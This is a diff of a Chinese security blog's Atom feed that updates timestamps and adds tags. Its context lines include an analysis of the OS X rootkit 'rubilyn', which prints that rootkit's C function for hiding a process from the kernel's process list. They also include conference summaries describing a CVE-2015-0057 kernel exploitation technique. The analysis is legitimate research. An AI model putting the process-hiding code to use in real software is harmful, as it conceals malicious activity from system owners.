@@ -5,7 +5,7 @@
   <link href="//atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2016-06-05T02:34:44.000Z</updated>
+  <updated>2016-06-05T02:45:36.000Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://yoursite.com/2016/06/05/osx_rootkit_rubilyn_analyze/"/>
     <id>http://yoursite.com/2016/06/05/osx_rootkit_rubilyn_analyze/</id>
     <published>2016-06-05T02:07:52.000Z</published>
-    <updated>2016-06-05T02:34:44.000Z</updated>
+    <updated>2016-06-05T02:45:36.000Z</updated>
     
     <content type="html">&lt;h3 id=&quot;1、隐藏进程&quot;&gt;&lt;a href=&quot;#1、隐藏进程&quot; class=&quot;headerlink&quot; title=&quot;1、隐藏进程&quot;&gt;&lt;/a&gt;1、隐藏进程&lt;/h3&gt;&lt;p&gt;在mac osx上,每个进程的上下文都保存在proc结构中,而在allproc链表中就保存着所有进程proc结构的指针，通过allproc链表移除相应进程的proc结构可隐藏正在进行的进程，下面是rubilyn中关于隐藏进程的代码，但目测通过ps -p pid 仍可列出进程，因为它并没有移除进程hash列表pidhashtbl中相关的进程信息，导致可通过pid查找到进程。&lt;/p&gt;
 &lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* modify allproc to hide a specific pid */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;hideproc&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; pid)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc* p;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(pid!=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// lh.first 指向allproc链表中的第1个元素，而p_list.le_next指向下个proc结构&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (p = my_allproc-&amp;gt;lh_first; p != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; p = p-&amp;gt;p_list.le_next) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(pid == p-&amp;gt;p_pid)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(hidden_p_count &amp;lt; MAX_HIDDEN_PROCESS)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    hidden_p[hidden_p_count]=p;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    hidden_p_count++;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    my_proc_list_lock();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    LIST_REMOVE(p, p_list); 	&lt;span class=&quot;comment&quot;&gt;// 移除p_list结构中关于p进程的元素&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    my_proc_list_unlock();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -60,6 +60,12 @@
     
     </summary>
     
+      <category term="技术分享" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
+    
+    
+      <category term="OSX" scheme="http://yoursite.com/tags/OSX/"/>
+    
+      <category term="rootkit" scheme="http://yoursite.com/tags/rootkit/"/>
     
   </entry>
   
@@ -68,7 +74,7 @@
     <link href="http://yoursite.com/2016/05/25/PHDays-2016/"/>
     <id>http://yoursite.com/2016/05/25/PHDays-2016/</id>
     <published>2016-05-25T02:09:17.000Z</published>
-    <updated>2016-06-04T05:08:32.000Z</updated>
+    <updated>2016-06-05T02:45:15.000Z</updated>
     
     <content type="html">&lt;h2 id=&quot;大会简介&quot;&gt;&lt;a href=&quot;#大会简介&quot; class=&quot;headerlink&quot; title=&quot;大会简介&quot;&gt;&lt;/a&gt;大会简介&lt;/h2&gt;&lt;p&gt;PHDays（Positive Hack Days）,俄罗斯著名的黑客大会，内容涵盖硬件安全、WEB安全、移动安全、网络安全等诸多专业安全领域，并且会议期间设有CTF夺旗竞技赛。&lt;/p&gt;
 &lt;p&gt;今年会议主要围绕以下主题：关键信息系统的安全性、欺诈管理、网络犯罪和事故调查、维基解密时代的政府与企业安全、网络战和网络间谍。同时，还设有安全论坛，云计算和虚拟基础设施的保护，0day攻防、DDOS防御、工控安全、业务应用和通信网络安全。&lt;/p&gt;
@@ -96,6 +102,10 @@
     
     </summary>
     
+      <category term="技术分享" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
+    
+    
+      <category term="PHDays" scheme="http://yoursite.com/tags/PHDays/"/>
     
   </entry>
   
@@ -104,7 +114,7 @@
     <link href="http://yoursite.com/2016/04/13/CanSecWest_2016/"/>
     <id>http://yoursite.com/2016/04/13/CanSecWest_2016/</id>
     <published>2016-04-13T03:47:32.000Z</published>
-    <updated>2016-06-04T02:28:03.000Z</updated>
+    <updated>2016-06-05T02:44:50.000Z</updated>
     
     <content type="html">&lt;p&gt;本周分析的安全大会主要以2016年CanSecWest黑客大会上的精彩议题为主，整体上，议题主要偏向于&lt;strong&gt;系统/软件漏洞挖掘与利用技术&lt;/strong&gt;。&lt;/p&gt;
 &lt;p&gt;各议题下载链接参见：&lt;a href=&quot;http://www.slideshare.net/CanSecWest/presentations&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.slideshare.net/CanSecWest/presentations&lt;/a&gt;&lt;/p&gt;
@@ -154,6 +164,10 @@
     
     </summary>
     
+      <category term="技术分享" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
+    
+    
+      <category term="CanSecWest" scheme="http://yoursite.com/tags/CanSecWest/"/>
     
   </entry>
   
@@ -162,7 +176,7 @@
     <link href="http://yoursite.com/2016/04/05/bh-asia-2016/"/>
     <id>http://yoursite.com/2016/04/05/bh-asia-2016/</id>
     <published>2016-04-05T02:27:11.000Z</published>
-    <updated>2016-06-04T02:27:12.000Z</updated>
+    <updated>2016-06-05T02:44:38.000Z</updated>
     
     <content type="html">&lt;h2 id=&quot;1、《A-New-CVE-2015-0057-Exploit-Technology》&quot;&gt;&lt;a href=&quot;#1、《A-New-CVE-2015-0057-Exploit-Technology》&quot; class=&quot;headerlink&quot; title=&quot;1、《A New CVE-2015-0057 Exploit Technology》&quot;&gt;&lt;/a&gt;1、《A New CVE-2015-0057 Exploit Technology》&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598336783953.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
 &lt;p&gt;来自FireEye公司分享的一种针对微软内核 win32k!xxxEnableWndSBArrows tagSBINFO/tagPROPLIST UAF漏洞CVE-2015-0057/MS15-010的利用方法，是被FireEye捕获到的一款Dyre银行木马变种所采用的利用技术,分为32位和64位不同平台下的方法。&lt;br&gt;&lt;strong&gt;【传统攻击方法】&lt;/strong&gt;：原有的攻击方法是由NCC Group安全组织公布的，采用”占坑“的攻击方式，用可控数据去填充已释放的tagPROPLIST，然后在32位下用SetScrollInfo去操作指向tagWND.strName.Buffer的tagWND.pSBInfo，而在64位下伪造的堆头结构_HEAP_ENTRY去指向tagWND.strName.Buffer，完成数据的覆盖，从而转化为任意地址读写。&lt;br&gt;&lt;strong&gt;【新型攻击方法】&lt;/strong&gt;：在32位系统下，== 采用tagMENU对象去填充已tagPROPLIST，然后借助tagMENU.cItems和tagMENU.rgItems来完成控制 ==;而在64位系统下，既借鉴了NCC使用tagWND去操作tagPROPLIST，又使用tagMENU去覆盖tagMENU.rgItems，因为rgItems数组指针指向的第一个元素是wID，通过SetMenuItemInfo()可实现完全控制,最终实现任意地址读写。&lt;/p&gt;
@@ -229,6 +243,10 @@
     
     </summary>
     
+      <category term="技术分享" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
+    
+    
+      <category term="BlackHat" scheme="http://yoursite.com/tags/BlackHat/"/>
     
   </entry>
   
